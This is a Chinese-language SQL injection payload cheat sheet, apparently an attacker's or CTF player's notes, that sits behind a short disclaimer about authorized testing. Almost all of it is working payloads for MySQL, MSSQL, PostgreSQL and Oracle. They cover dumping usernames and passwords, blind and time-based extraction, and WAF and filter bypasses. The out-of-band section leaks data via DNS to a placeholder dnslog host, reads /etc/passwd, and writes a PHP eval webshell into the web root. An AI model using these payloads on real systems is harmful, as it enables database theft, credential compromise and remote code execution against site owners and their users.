# SQL 注入 · Payload

> ⚠️ 仅用于**合法授权的安全测试**与 **CTF 赛题环境**。原理见 [原理笔记.md](原理笔记.md)。
> 用法：`<这里替换>` 是变量；`-- -` 中的空格必不可少（MySQL 要求 `--` 后跟空白）。

## 探测 / 判存在

| 场景 | Payload | 说明 |
| --- | --- | --- |
| 单引号探错 | `'` | 报错 → 引号型注入 |
| 双引号探错 | `"` | 报错 → 双引号型 |
| 数字型 | `1 and 1=1` / `1 and 1=2` | 无需闭合引号 |
| 括号闭合 | `1) and 1=1 -- -` | 原语句类似 `where id=(1)` |
| 布尔真假对比 | `' and '1'='1` / `' and '1'='2` | 页面差异 → 布尔盲注 |
| 时间盲注 | `' and sleep(5) -- -` | 响应慢 5 秒 → 时间盲注 |
| 堆叠注入 | `'; select 1 -- -` | 执行成功说明支持多语句 |

## 获取信息

| 场景 | Payload | 说明 |
| --- | --- | --- |
| 库名/用户/版本 | `' union select 1,database(),version() -- -` | 先确定列数并找到回显位 |
| 当前用户 | `' union select 1,user(),3 -- -` | |
| 全部库名 | `' union select 1,group_concat(schema_name),3 from information_schema.schemata -- -` | |
| 表名 | `' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() -- -` | |
| 列名 | `' union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273 -- -` | `0x...` 是 `users` 的十六进制，绕过引号过滤 |
| 取数据 | `' union select 1,group_concat(username,0x3a,password),3 from users -- -` | `0x3a` 是冒号 |
| MySQL 5.7+ 无 information_schema | `' union select 1,group_concat(table_name),3 from mysql.innodb_table_stats -- -` | 备选元数据源 |

## 报错注入（页面回显数据库错误时）

| 场景 | Payload | 说明 |
| --- | --- | --- |
| extractvalue 取库名 | `' and extractvalue(1,concat(0x7e,database())) -- -` | 回显 `~库名` |
| updatexml 取库名 | `' and updatexml(1,concat(0x7e,database()),1) -- -` | 同上，两者可互相备份 |
| 取表名 | `' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) -- -` | 报错回显约 32 字符上限，用 `substr()` 分段 |
| 分段截取 | `' and extractvalue(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,30))) -- -` | 改 `1,30` → `31,30` 继续 |
| 无回显位也可用 | `' and (select 1 from(select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a) -- -` | 主键冲突报错（rand 型） |
| 几何函数报错 | `' and geometrycollection((select * from(select * from(select database())a)b)) -- -` | 备选函数族 |

## 布尔盲注（无回显，页面有真假差异）

| 场景 | Payload | 说明 |
| --- | --- | --- |
| 判断库名首字符 | `' and substr(database(),1,1)='e' -- -` | 逐字符猜 |
| 用 ascii 二分 | `' and ascii(substr(database(),1,1))>100 -- -` | 二分比逐字符快 |
| 判断长度 | `' and length(database())=5 -- -` | 先定长度再逐位 |
| 正则加速 | `' and (select database()) regexp '^e' -- -` | 匹配前缀，可用 `^[a-m]` 批量缩范围 |

## 时间盲注（连页面差异都没有）

| 场景 | Payload | 说明 |
| --- | --- | --- |
| 基础延时 | `' and sleep(5) -- -` | 先确认可用 |
| 条件延时 | `' and if(substr(database(),1,1)='e',sleep(5),0) -- -` | MySQL `if()` |
| case when 写法 | `' and case when (ascii(substr(database(),1,1))>100) then sleep(5) else 0 end -- -` | 更通用 |
| 无 sleep 权限 | `' and benchmark(5000000,md5(1)) -- -` | 计算密集替代 |
| 笛卡尔积延时 | `' and (select count(*) from information_schema.columns a,information_schema.columns b,information_schema.columns c)>0 -- -` | 重型查询拖时间 |
| MSSQL | `'; waitfor delay '0:0:5' -- ` | |
| PostgreSQL | `'; select pg_sleep(5) -- ` | |
| Oracle | `' and 1=dbms_pipe.receive_message(('a'),5) -- ` | |

## 绕过过滤

| 过滤了什么 | 绕过写法 | 说明 |
| --- | --- | --- |
| 空格 | `/**/`、`%09`、`%0a`、`+`、`()` | `union/**/select` |
| 单引号 | 十六进制 `0x7573657273`、`char(117,115,101,114,115)` | 适用于字符串比较 |
| 关键字 `select` | `SeLeCt`、`sel%00ect`、`sel/**/ect` | 大小写与内联注释最常用 |
| 关键字 `union select` | `union%0aselect`、`/*!50000union*/ select` | MySQL 版本注释 |
| 关键字 `and`/`or` | `&&`、`\|\|`、`^`、`xor` | |
| 关键字 `=` | `like`、`regexp`、`between`、`in`、`>`/`<` | 盲注比较常用 |
| 关键字 `sleep` | `benchmark()`、`get_lock()` | |
| 逗号被过滤 | `substr(x from 1 for 1)`、`limit 0,1` → `limit 1 offset 0` | |
| 宽字节环境 (GBK) | `%df'` | 吃掉转义反斜杠，`%df%5c` 合成一个汉字 |
| `information_schema` 被拦 | `mysql.innodb_table_stats`、`sys.schema_table_statistics` | |
| WAF 拦 `union` | `union all select`、内联注释拆分、`/*!50000union*/` | |

## 外带 / OOB（全盲无延时）

| 场景 | Payload | 说明 |
| --- | --- | --- |
| MySQL Windows UNC | `' and load_file('\\\\<dnslog域名>\\a') -- -` | 触发 DNS 请求 |
| MySQL Linux | `' union select 1,load_file('/etc/passwd'),3 -- -` | 直接读文件 |
| 写 webshell | `' union select 1,'<?php @eval($_POST[1]);?>',3 into outfile '/var/www/html/shell.php' -- -` | 需 FILE 权限 + 可写目录 |
| 写文件被 secure_file_priv 限制 | `' union select 1,'<?php eval($_POST[1]);?>',3 into dumpfile '/var/lib/mysql/x.php' -- -` | 换可写路径试 |
| MSSQL OOB | `'; exec master..xp_dirtree '\\<dnslog>\a' -- ` | 需 `xp_dirtree` 可用 |
| Oracle OOB | `' union select 1,(select utl_inaddr.get_host_address((select user)||'.<dnslog>') from dual),3 from dual -- ` | |

## 记录笔记的规矩

新增 payload 时**必须写清适用条件**（数据库、版本、需要什么权限、前提），否则三个月后自己都不敢用。
